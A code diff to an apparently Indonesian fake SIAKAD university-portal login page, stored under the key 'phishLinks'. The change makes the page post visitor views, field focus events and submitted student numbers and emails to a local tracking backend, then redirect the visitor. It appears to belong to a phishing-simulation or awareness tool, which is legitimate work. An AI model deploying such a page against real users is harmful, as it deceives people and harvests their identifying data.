@@ -485,32 +485,87 @@
     </div>
 
     <script>
+        // ============================================
+        // BACKEND API CONFIGURATION
+        // ============================================
+        const API_URL = 'http://localhost:5000/api';
+        
         const urlParams = new URLSearchParams(window.location.search);
-        const linkId = urlParams.get('id') || 'demo';
+        const linkId = urlParams.get('id');
 
-        function trackView() {
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
+        if (!linkId) {
+            console.error('Link ID tidak ditemukan di URL!');
+        }
+
+        // ============================================
+        // TRACK PAGE VIEW
+        // ============================================
+        async function trackView() {
+            if (!linkId) return;
             
-            if (link) {
-                link.views = (link.views || 0) + 1;
-                if (!link.visitors) link.visitors = [];
-                
-                const visitorId = Date.now();
-                link.visitors.push({
-                    id: visitorId,
-                    timestamp: Date.now(),
-                    duration: 0,
-                    inputData: false
+            try {
+                const response = await fetch(`${API_URL}/log-activity`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        link_id: linkId,
+                        activity_type: 'view',
+                        data: 'SIAKAD Portal dibuka'
+                    })
                 });
-                
-                const linkIndex = links.findIndex(l => l.id === linkId);
-                links[linkIndex] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-                
-                sessionStorage.setItem('visitorId', visitorId);
-                sessionStorage.setItem('linkId', linkId);
-                sessionStorage.setItem('startTime', Date.now());
+
+                const result = await response.json();
+                if (result.success) {
+                    console.log('✅ View tracked');
+                }
+            } catch (error) {
+                console.error('❌ Error tracking view:', error);
+            }
+        }
+
+        // ============================================
+        // TRACK CLICK
+        // ============================================
+        async function trackClick(fieldName) {
+            if (!linkId) return;
+            
+            try {
+                await fetch(`${API_URL}/log-activity`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        link_id: linkId,
+                        activity_type: 'click',
+                        data: `Field diklik: ${fieldName}`
+                    })
+                });
+            } catch (error) {
+                console.error('❌ Error tracking click:', error);
+            }
+        }
+
+        // ============================================
+        // TRACK SUBMIT
+        // ============================================
+        async function trackSubmit(formData) {
+            if (!linkId) return;
+            
+            try {
+                await fetch(`${API_URL}/log-activity`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        link_id: linkId,
+                        activity_type: 'submit',
+                        data: JSON.stringify({
+                            nim: formData.nim,
+                            email: formData.email,
+                            timestamp: new Date().toISOString()
+                        })
+                    })
+                });
+            } catch (error) {
+                console.error('❌ Error tracking submit:', error);
             }
         }
 
@@ -531,8 +586,22 @@
             e.target.value = e.target.value.replace(/\D/g, '');
         });
 
+        // Track clicks on input fields
+        let clickedFields = new Set();
+
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                const fieldName = this.id || 'unknown';
+                
+                if (!clickedFields.has(fieldName)) {
+                    clickedFields.add(fieldName);
+                    trackClick(fieldName);
+                }
+            });
+        });
+
         // Form submission
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const pin = document.getElementById('pin').value;
@@ -542,58 +611,25 @@
                 return;
             }
             
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            
-            if (link) {
-                link.inputData = (link.inputData || 0) + 1;
-                
-                const visitorId = sessionStorage.getItem('visitorId');
-                const startTime = parseInt(sessionStorage.getItem('startTime'));
-                const duration = Math.floor((Date.now() - startTime) / 1000);
-                
-                const visitor = link.visitors.find(v => v.id == visitorId);
-                if (visitor) {
-                    visitor.inputData = true;
-                    visitor.duration = duration;
-                }
-                
-                const linkIndex = links.findIndex(l => l.id === linkId);
-                links[linkIndex] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-            }
+            const formData = {
+                nim: document.getElementById('nim').value,
+                email: document.getElementById('email').value
+            };
             
             const btn = e.target.querySelector('.btn-login');
             btn.textContent = '⏳ Memverifikasi...';
             btn.disabled = true;
+            
+            await trackSubmit(formData);
             
             setTimeout(() => {
                 window.location.href = 'index.html';
             }, 2000);
         });
 
-        trackView();
-
-        window.addEventListener('beforeunload', () => {
-            const visitorId = sessionStorage.getItem('visitorId');
-            const linkId = sessionStorage.getItem('linkId');
-            const startTime = parseInt(sessionStorage.getItem('startTime'));
-            
-            if (visitorId && linkId && startTime) {
-                const duration = Math.floor((Date.now() - startTime) / 1000);
-                let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-                const link = links.find(l => l.id === linkId);
-                
-                if (link) {
-                    const visitor = link.visitors.find(v => v.id == visitorId);
-                    if (visitor && !visitor.inputData) {
-                        visitor.duration = duration;
-                    }
-                    const linkIndex = links.findIndex(l => l.id === linkId);
-                    links[linkIndex] = link;
-                    localStorage.setItem('phishLinks', JSON.stringify(links));
-                }
-            }
+        // Track view on page load
+        window.addEventListener('DOMContentLoaded', () => {
+            trackView();
         });
     </script>
 </body>
